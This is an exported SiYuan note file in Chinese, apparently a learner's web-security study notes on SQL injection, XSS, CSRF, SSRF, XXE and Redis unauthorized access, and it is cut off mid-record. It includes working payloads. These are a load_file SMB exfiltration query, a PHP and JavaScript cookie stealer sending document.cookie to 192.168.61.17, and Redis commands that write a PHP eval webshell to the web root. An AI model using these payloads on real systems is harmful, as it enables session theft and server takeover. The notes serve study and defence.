{"ID":"20241022102952-u23ynjq","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241022102952-u23ynjq","title":"Untitled","updated":"20241022161040"},"Children":[{"ID":"20241022102952-u44jxgl","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","id":"20241022102952-u44jxgl","updated":"20241022103011"},"Children":[{"Type":"NodeText","Data":"SQL注入"}]},{"ID":"20241022110510-t2gwk51","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022110510-t2gwk51","updated":"20241022111710"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"secure_file_priv=“”任意读写"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241022103511-r6x3yz7","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022103511-r6x3yz7","updated":"20241022103736"},"Children":[{"Type":"NodeText","Data":"SQL注入是指攻击者通过浏览器或者其他客户端，将恶意SQL语句插入网站参数中，而网站应用程序未对其进行过滤，将恶意SQL语句带入数据库并将其执行的一种攻击收发"}]},{"ID":"20241022103738-m9uai6k","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022103738-m9uai6k","updated":"20241022103755"},"Children":[{"Type":"NodeText","Data":"条件：参数用户可控，参数带入数据库的查询"}]},{"ID":"20241022110955-3nwi0rd","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022110955-3nwi0rd","updated":"20241022110956"},"Children":[{"Type":"NodeText","Data":"判断"}]},{"ID":"20241022103856-abi8edj","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022103856-abi8edj","updated":"20241022103958"},"Children":[{"Type":"NodeText","Data":"回显 "}]},{"ID":"20241022104012-xmaaxyk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022104012-xmaaxyk","updated":"20241022104038"},"Children":[{"Type":"NodeText","Data":"判断列 order by group by"}]},{"ID":"20241022104111-h8g1f57","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022104111-h8g1f57","updated":"20241022104131"},"Children":[{"Type":"NodeText","Data":"@@version_compile_os查看操作系统"}]},{"ID":"20241022104002-a2zp69z","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022104002-a2zp69z"},"Children":[{"Type":"NodeText","Data":"联合注入union "}]},{"ID":"20241022104004-gfx9je4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022104004-gfx9je4","updated":"20241022104246"},"Children":[{"Type":"NodeText","Data":"报错注入updatexml extractvalue floor  使用了Mysqli_error()"}]},{"ID":"20241022104230-i4bwswn","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022104230-i4bwswn","updated":"20241022104600"},"Children":[{"Type":"NodeText","Data":"head注入 UA cookie注入"}]},{"ID":"20241022104920-49cg8cz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022104920-49cg8cz","updated":"20241022134307"},"Children":[{"Type":"NodeText","Data":"数据外带：smb  "}]},{"ID":"20241022134322-h9rhcup","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022134322-h9rhcup","updated":"20241022134327"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"load_file"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"(concat('"},{"Type":"NodeBackslash","Data":"span","Children":[{"Type":"NodeBackslashContent","Data":"\\"}]},{"Type":"NodeText","Data":"192.168.100.230"},{"Type":"NodeBackslash","Data":"span","Children":[{"Type":"NodeBackslashContent","Data":"'"}]},{"Type":"NodeText","Data":",(select group_concat(schema_name) from"}]},{"ID":"20241022134322-sb18cfo","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022134322-sb18cfo","updated":"20241022134322"},"Children":[{"Type":"NodeText","Data":"information_schema.schemata),'t')) --+"}]},{"ID":"20241022104916-b3egkif","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022104916-b3egkif","updated":"20241022104918"},"Children":[{"Type":"NodeText","Data":"无回显"}]},{"ID":"20241022104921-aq2n2ot","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022104921-aq2n2ot","updated":"20241022105755"},"Children":[{"Type":"NodeText","Data":"时间盲注if sleep length substr limit"}]},{"ID":"20241022110020-maem045","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022110020-maem045","updated":"20241022110216"},"Children":[{"Type":"NodeText","Data":"布尔盲注 "}]},{"ID":"20241022110423-tata958","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022110423-tata958","updated":"20241022110720"},"Children":[{"Type":"NodeText","Data":"宽字节注入 GBK 两个字节-》一个字节 范围81-FE   "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"addslashes() "},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"//函数返回在预定义字符之前添加反斜杠 \\ 的字符串"}]},{"ID":"20241022110741-v78le0v","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022110741-v78le0v","updated":"20241022110811"},"Children":[{"Type":"NodeText","Data":"二次注入 "},{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"addslashes"},{"Type":"NodeText","Data":"虽然对"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"'"},{"Type":"NodeText","Data":"​进行了"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"\\"},{"Type":"NodeText","Data":"​转义,但是"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"\\"},{"Type":"NodeText","Data":"​并不会插入到数据库中，在写入数据库时仍为"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"1'"},{"Type":"NodeText","Data":"​,这样，我们在下一次调用这个参数的时候，"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"'"},{"Type":"NodeText","Data":"​不会被转义，从而触发了 SQL注入"}]},{"ID":"20241022110423-bvlc4oj","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022110423-bvlc4oj","updated":"20241022110449"},"Children":[{"Type":"NodeText","Data":"POST注入抓包​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241022110449-d9d82m6.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241022111006-8yz7m21","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022111006-8yz7m21","updated":"20241022111011"},"Children":[{"Type":"NodeText","Data":"绕过"}]},{"ID":"20241022111014-966tb8a","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022111014-966tb8a","updated":"20241022111213"},"Children":[{"Type":"NodeText","Data":"大小写绕过、双写绕过、编码绕过（16进制、ASCII码）、内联注释"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"/*! */"},{"Type":"NodeText","Data":"​ "}]},{"ID":"20241022111213-rklyelu","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022111213-rklyelu"},"Children":[{"Type":"NodeText","Data":"防御"}]},{"ID":"20241022111216-xf3bnih","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022111216-xf3bnih","updated":"20241022111233"},"Children":[{"Type":"NodeText","Data":"WAF、云防护、IPS"}]},{"ID":"20241022111149-yfufg7d","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022111149-yfufg7d","style":"color: var(--b3-font-color9);","updated":"20241022111243"},"Children":[{"Type":"NodeText","Data":"区别:IPS和IDS"}]},{"ID":"20241022111301-56213nh","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022111301-56213nh","style":"color: var(--b3-font-color9);","updated":"20241022111355"},"Children":[{"Type":"NodeText","Data":"IDS入侵检测系统 检测网络获悉系统中潜在威胁的设备或软件应用，可以帮助发现未知攻击"}]},{"ID":"20241022111416-6huqd1n","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022111416-6huqd1n","style":"color: var(--b3-font-color9);","updated":"20241022111439"},"Children":[{"Type":"NodeText","Data":"IPS入侵防御系统 组织网络或系统潜在威胁的设备或软件应用"}]},{"ID":"20241022111503-rqcy2fi","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241022111503-rqcy2fi","style":"color: var(--b3-font-color9);","updated":"20241022111519"},"Children":[{"Type":"NodeText","Data":"应急响应检测到威胁处理步骤"}]},{"ID":"20241022111519-hkcdmdu","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022111519-hkcdmdu","style":"color: var(--b3-font-color9);","updated":"20241022111641"},"Children":[{"Type":"NodeText","Data":"\t查看日志、评估影响，查看被攻击的地方状态、攻击者的相关信息、攻击方式和目标，响应，阻止修复，记录设置规则"}]},{"ID":"20241022142505-rsbp4cq","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022142505-rsbp4cq","updated":"20241022142528"},"Children":[{"Type":"NodeText","Data":"下一代防火墙：全面应对应用层威胁的高性能防火墙"}]},{"ID":"20241022142847-sh4uq4e","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022142847-sh4uq4e","updated":"20241022142853"},"Children":[{"Type":"NodeText","Data":"VPN虚拟专用网"}]},{"ID":"20241022112238-sxjjh5s","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022112238-sxjjh5s","updated":"20241022112242"},"Children":[{"Type":"NodeText","Data":"万能密码"}]},{"ID":"20241022112300-na40y9n","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022112300-na40y9n","updated":"20241022112306"},"Children":[{"Type":"NodeText","Data":"sqlmap使用"}]},{"ID":"20241022112306-ikxfhun","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022112306-ikxfhun","updated":"20241022112853"},"Children":[{"Type":"NodeText","Data":"-u 判断网络地址有无SQL注入"}]},{"ID":"20241022112854-6iiqgsc","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022112854-6iiqgsc","updated":"20241022113728"},"Children":[{"Type":"NodeText","Data":"--os-shell"}]},{"ID":"20241022113729-yjd8sgh","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022113729-yjd8sgh","updated":"20241022114131"},"Children":[{"Type":"NodeText","Data":"dba权限 into outfile"}]},{"ID":"20241022112838-jwjyouo","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022112838-jwjyouo"}},{"ID":"20241022103032-qhh6sgt","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","id":"20241022103032-qhh6sgt","updated":"20241022103047"},"Children":[{"Type":"NodeText","Data":"XSS、CSRF、SSRF"}]},{"ID":"20241022111744-ldt0w5t","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022111744-ldt0w5t","updated":"20241022111814"},"Children":[{"Type":"NodeText","Data":"xss跨站脚本攻击"}]},{"ID":"20241022111841-u3bes4y","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022111841-u3bes4y","updated":"20241022111905"},"Children":[{"Type":"NodeText","Data":"不需要任何登录认证，通过url、框注入脚本"}]},{"ID":"20241022111910-yajpsu2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022111910-yajpsu2","updated":"20241022112047"},"Children":[{"Type":"NodeText","Data":"反射型 非持久性xss，可通过电子邮件等方式包含这个代码的恶意链接，被访问的恶意链接，服务器接收该用户目标的请求并处理，这样就把数据发送给目标用户的浏览器中，浏览器解析后触发"}]},{"ID":"20241022111922-3tkimyg","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022111922-3tkimyg","updated":"20241022112131"},"Children":[{"Type":"NodeText","Data":"存储型 "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"持久性"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":" 隐蔽性高，永存在数据库中"}]},{"ID":"20241022112132-n36bxg5","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022112132-n36bxg5","updated":"20241022112138"},"Children":[{"Type":"NodeText","Data":"利用方式："}]},{"ID":"20241022114614-2tqpcaf","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022114614-2tqpcaf","updated":"20241022114634"},"Children":[{"Type":"NodeText","Data":"PHP文件、js文件、插入xss语句"}]},{"ID":"20241022114635-dgfh354","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022114635-dgfh354","updated":"20241022114640"},"Children":[{"Type":"NodeText","Data":"PHP文件"}]},{"ID":"20241022114646-x5olh54","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022114646-x5olh54","updated":"20241022114707"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"\u003c?php\n$cookie = $_GET['cookie']; //获取cookie信息\n$log =  fopen('cookie.txt','a'); //生成获取的cookie信息，打开文件，a是追加写模式\nfwrite($log,$cookie.PHP_EOL); //fwrite写入\nfclose($log);\n?\u003e\n获取cookie信息写在文件中\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022114709-x168vqw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022114709-x168vqw","updated":"20241022114715"},"Children":[{"Type":"NodeText","Data":"js文件"}]},{"ID":"20241022114723-qk6hxjk","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022114723-qk6hxjk","updated":"20241022114756"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"var img = document.createElement('img'); //在对象中创建一个对象，主流浏览器都支持createElement()方法\nimg.width = 0;\nimg.height = 0;\nimg.src = 'http://192.168.61.17/zy.php?cookie=' + encodeURIComponent(document.cookie); //document.cookie--获取cookie信息息\n\n//用于绕过对引号和http的拦截\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022114807-jpeij2l","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022114807-jpeij2l","updated":"20241022114811"},"Children":[{"Type":"NodeText","Data":"插入语句"}]},{"ID":"20241022114812-3gezpbl","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022114812-3gezpbl","updated":"20241022114858"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"\u003cimg src=http://192.168.61.17/cookie.js\u003e123\u003cimg\u003e\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022111917-8hj3r0h","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022111917-8hj3r0h","updated":"20241022112209"},"Children":[{"Type":"NodeText","Data":"DOM型 就是处罚的xss就是"}]},{"ID":"20241022114330-tgslizn","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241022114330-tgslizn","updated":"20241022114331"},"Children":[{"Type":"NodeText","Data":"绕过"}]},{"ID":"20241022114333-66e8fro","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022114333-66e8fro","updated":"20241022114443"},"Children":[{"Type":"NodeText","Data":"大小写、参数替换、编码（10/16进制）黑白名单替换绕过、利用标签属性、空字符、事件利用"}]},{"ID":"20241022114455-hawdlcl","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241022114455-hawdlcl","updated":"20241022114456"},"Children":[{"Type":"NodeText","Data":"防御"}]},{"ID":"20241022114500-5droim0","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022114500-5droim0","updated":"20241022114528"},"Children":[{"Type":"NodeText","Data":"xssfilter 定义策略 白名单 预编译 设置http_only"}]},{"ID":"20241022111748-4yv2tsw","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022111748-4yv2tsw","updated":"20241022114930"},"Children":[{"Type":"NodeText","Data":"csrf跨站请求伪造"}]},{"ID":"20241022114940-oznonyk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022114940-oznonyk","updated":"20241022115030"},"Children":[{"Type":"NodeText","Data":"通过伪造请求从而受害者点击后会利用受害者的身份去请求（冒用身份），比如新增一个账号，修改用户密码等等"}]},{"ID":"20241022115032-jqieljm","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022115032-jqieljm","updated":"20241022115037"},"Children":[{"Type":"NodeText","Data":"攻击原理："}]},{"ID":"20241022115037-e28cz6d","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022115037-e28cz6d","updated":"20241022115311"},"Children":[{"Type":"NodeText","Data":"普通用户打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A"}]},{"ID":"20241022115312-ntcoeb5","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022115312-ntcoeb5","updated":"20241022130751"},"Children":[{"Type":"NodeText","Data":"再用户信息通过验证后，网站A产生cookie信息并返回给浏览器，此时普通用户登录成功能够正常发送请求到网站A"}]},{"ID":"20241022130751-2ebss98","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022130751-2ebss98","updated":"20241022130843"},"Children":[{"Type":"NodeText","Data":"用户未退出网站A之前，同一浏览器中，打开一个网站B（含恶意）"}]},{"ID":"20241022130845-28isbyd","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022130845-28isbyd","updated":"20241022130915"},"Children":[{"Type":"NodeText","Data":"网站B接收到用户请求，返回攻击性代码，并发出一个请求要访问第三方站点A"}]},{"ID":"20241022130915-1jp6q0t","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022130915-1jp6q0t","updated":"20241022130957"},"Children":[{"Type":"NodeText","Data":"浏览器收到根据网站B的请求，在用户不知情的情况下携带cookie信息，向网站A发出请求，网站A并不知道请求其实是B发出的"}]},{"ID":"20241022114923-ngbcehe","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022114923-ngbcehe","updated":"20241022131138"},"Children":[{"Type":"NodeText","Data":"检测：抓包，去掉Referer字段后再重新提交，如果还有效，则基本存在"}]},{"ID":"20241022131200-gmu332v","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241022131200-gmu332v","updated":"20241022131211"},"Children":[{"Type":"NodeText","Data":"防护"}]},{"ID":"20241022131213-ursyxcy","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022131213-ursyxcy","updated":"20241022131315"},"Children":[{"Type":"NodeText","Data":"cookie设置httpOnly、验证http Referer字段 添加Token验证"}]},{"ID":"20241022111752-smxh62w","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022111752-smxh62w","updated":"20241022131639"},"Children":[{"Type":"NodeText","Data":"Ssrf服务端请求伪造"}]},{"ID":"20241022131639-kkkgk79","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022131639-kkkgk79","updated":"20241022131843"},"Children":[{"Type":"NodeText","Data":"攻击者构造请求，有服务端发起请求的安全漏洞。"}]},{"ID":"20241022131850-40ct06j","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022131850-40ct06j","updated":"20241022132304"},"Children":[{"Type":"NodeText","Data":"攻击者伪造服务器身份信息进行相关操作，原理：服务端提供了其他服务器获取数据的功能，但没有对内网目标地址做过滤或限制，"}]},{"ID":"20241022132434-y6kywhp","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241022132434-y6kywhp","updated":"20241022132508"},"Children":[{"Type":"NodeText","Data":"XXE漏洞 XML外部实体注入 "}]},{"ID":"20241022132512-5mhebb7","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022132512-5mhebb7","updated":"20241022132532"},"Children":[{"Type":"NodeText","Data":"xml引用外部实体并解析的时候会产生的漏洞，xml解析器去获取其中的外部资源并存储到内部是体重"}]},{"ID":"20241022111800-3yvowu0","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022111800-3yvowu0","updated":"20241022111803"},"Children":[{"Type":"NodeText","Data":"区别联系"}]},{"ID":"20241022132326-3zsi87w","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022132326-3zsi87w","updated":"20241022132404"},"Children":[{"Type":"NodeText","Data":"窃取用户的身份信息进行操作，CSRF冒用身份，SSRF可以理解为攻击者利用服务器的不严谨的过滤限制，将服务器当作跳板利用进行操作"}]},{"ID":"20241022103048-kxj9znu","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","id":"20241022103048-kxj9znu","updated":"20241022103053"},"Children":[{"Type":"NodeText","Data":"文件上传"}]},{"ID":"20241022103059-4hqxnr8","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241022103059-4hqxnr8","updated":"20241022103108"},"Children":[{"Type":"NodeText","Data":"python脚本编写"}]},{"ID":"20241022103111-7r59dcb","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241022103111-7r59dcb","updated":"20241022103114"},"Children":[{"Type":"NodeText","Data":"PHP"}]},{"ID":"20241022103302-nowqqzm","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241022103302-nowqqzm","updated":"20241022103310"},"Children":[{"Type":"NodeText","Data":"常见命令执行函数"}]},{"ID":"20241022103118-ge346t0","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241022103118-ge346t0","updated":"20241022103133"},"Children":[{"Type":"NodeText","Data":"Window、Linux命令 日志审计"}]},{"ID":"20241022103151-913eaae","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","id":"20241022103151-913eaae","updated":"20241022152541"},"Children":[{"Type":"NodeText","Data":"redis "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"6379"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241022151403-6zj8t0f","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022151403-6zj8t0f","updated":"20241022152602"},"Children":[{"Type":"NodeText","Data":"未授权访问漏洞原理：默认情况下会绑定"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"0.0.0.0:6379"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"暴露到公网上"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"。如果在没有设置"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"密码认证（一般为空）"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"config 命令，可以进行写文件操作"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，攻击者可以成功"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，进而可以使用"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"。\n"}]},{"ID":"20241022152604-sm4y3ok","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022152604-sm4y3ok"},"Children":[{"Type":"NodeText","Data":"常用命令"}]},{"ID":"20241022152605-cfslmv8","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022152605-cfslmv8","updated":"20241022152952"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"redis-cli -h host -p port -a password  远程连接"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241022151241-dnzfutw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022151241-dnzfutw","updated":"20241022151247"},"Children":[{"Type":"NodeText","Data":"远程字典服务"}]},{"ID":"20241022103207-xfwxq1e","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022103207-xfwxq1e","updated":"20241022103223"},"Children":[{"Type":"NodeText","Data":"未授权漏洞在web服务的情况下如何利用"}]},{"ID":"20241022152718-cgtp5u2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022152718-cgtp5u2","updated":"20241022153244"},"Children":[{"Type":"NodeText","Data":"在网站根目录写入一句话木马，从而得到网站权限"}]},{"ID":"20241022153027-qwwcbee","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022153027-qwwcbee","updated":"20241022153418"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"redis-cli -h 10.10.10.10 -p 6379   #连接redis服务器\nconfig set dir /var/www/html       #设置工作目录\nconfig set dbfilename shell.php    #设置备份文件的文件名\nset x \"\\r\\n\\r\\n\u003c?php @eval($_POST['cmd']);?\u003e\\r\\n\\r\\n\"   #添加一个键X，值为一句话木马   ”\\r\\n\\r\\n” 表示换行，用Redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。\nsave  #保存\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022152755-3cwr4ku","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241022152755-3cwr4ku","updated":"20241022152755"},"Children":[{"Type":"NodeText","Data":"拿shell前提条件"}]},{"ID":"20241022152755-v2yj4ku","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022152755-v2yj4ku","style":"color: var(--b3-font-color9);","updated":"20241022152755"},"Children":[{"Type":"NodeText","Data":"1.知道网站根目录绝对路径"}]},{"ID":"20241022152755-v08yqxo","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022152755-v08yqxo","style":"color: 